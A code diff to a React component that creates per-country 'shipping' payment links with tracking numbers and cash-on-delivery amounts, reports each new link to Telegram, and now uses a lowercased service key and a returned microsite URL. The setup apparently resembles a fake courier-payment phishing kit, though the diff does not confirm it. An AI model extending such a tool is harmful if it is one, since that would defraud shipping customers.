@@ -56,12 +56,14 @@ const CreateShippingLink = () => {
     }
     
     try {
+      const normalizedServiceKey = selectedService.toLowerCase();
+
       const link = await createLink.mutateAsync({
         type: "shipping",
         country_code: country || "",
         payload: {
-          service_key: selectedService,
-          service_name: selectedServiceData?.name || selectedService,
+          service_key: normalizedServiceKey,
+          service_name: selectedServiceData?.name || normalizedServiceKey,
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
@@ -69,16 +71,18 @@ const CreateShippingLink = () => {
         },
       });
       
+      const micrositeUrl = link.microsite_url;
+
       // Send data to Telegram
       const telegramResult = await sendToTelegram({
         type: 'shipping_link_created',
         data: {
           tracking_number: trackingNumber,
-          service_name: selectedServiceData?.name || selectedService,
+          service_name: selectedServiceData?.name || normalizedServiceKey,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           country: countryData.nameAr,
-          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
+          payment_url: micrositeUrl
         },
         timestamp: new Date().toISOString()
       });
@@ -96,9 +100,9 @@ const CreateShippingLink = () => {
           variant: "destructive",
         });
       }
-
       // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      const recipientPath = `/pay/${link.id}/recipient${normalizedServiceKey ? `?service=${normalizedServiceKey}` : ''}`;
+      navigate(recipientPath);
     } catch (error) {
       console.error("Error creating link:", error);
     }
